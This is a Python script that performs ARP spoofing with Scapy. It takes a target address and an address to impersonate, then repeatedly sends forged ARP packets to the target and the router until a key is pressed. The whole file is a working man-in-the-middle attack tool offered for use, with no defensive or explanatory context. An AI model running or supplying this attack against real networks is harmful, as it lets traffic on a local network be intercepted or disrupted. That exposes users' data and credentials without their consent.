import msvcrt
from scapy.all import *
import threading
import config
from datetime import datetime
import os
import time
import sys

CONTINUE = True


def get_time_string():
    now = datetime.now()
    return str(now.year) + "-" + str(now.month) + "-" + str(now.day) + " " + str(now.hour) + ":" + str(now.minute)


def wait_for_stop():
    global CONTINUE
    msvcrt.getch()
    CONTINUE = False


def attack(host_to_attack, host_to_impersonate):
    packet_to_target = Ether() / ARP(op=config.WHO_HAS_REQUEST, psrc=host_to_impersonate, pdst=host_to_attack)
    packet_to_router = Ether() / ARP(op=config.IS_AT_REQUEST, psrc=host_to_attack, pdst=host_to_impersonate)
    packets_count = 0
    print(config.SHOW_TARGET_MESSAGE % host_to_attack)
    print(config.GUIDELINE_MESSAGE + os.linesep)
    wait_for_stop_thread = threading.Thread(target=wait_for_stop)
    wait_for_stop_thread.start()

    while CONTINUE:
        sys.stdout.write(config.SHOW_PACKETS_COUNT_MESSAGE % str(packets_count))
        sys.stdout.flush()
        sendp(packet_to_target, verbose=config.PACKET_VERBOSE)
        sendp(packet_to_router, verbose=config.PACKET_VERBOSE)
        packets_count += 2
        time.sleep(config.SLEEP_TIME)


def main():
    if len(sys.argv) == 3:
        print(os.linesep + config.OPENING_MESSAGE % get_time_string() + os.linesep)
        host_to_attack = sys.argv[1]
        host_to_impersonate = sys.argv[2]

        attack(host_to_attack, host_to_impersonate)
    else:
        print(config.INVALID_ARGUMENTS_MESSAGE)
        sys.exit(1)


if __name__ == '__main__':
    main()
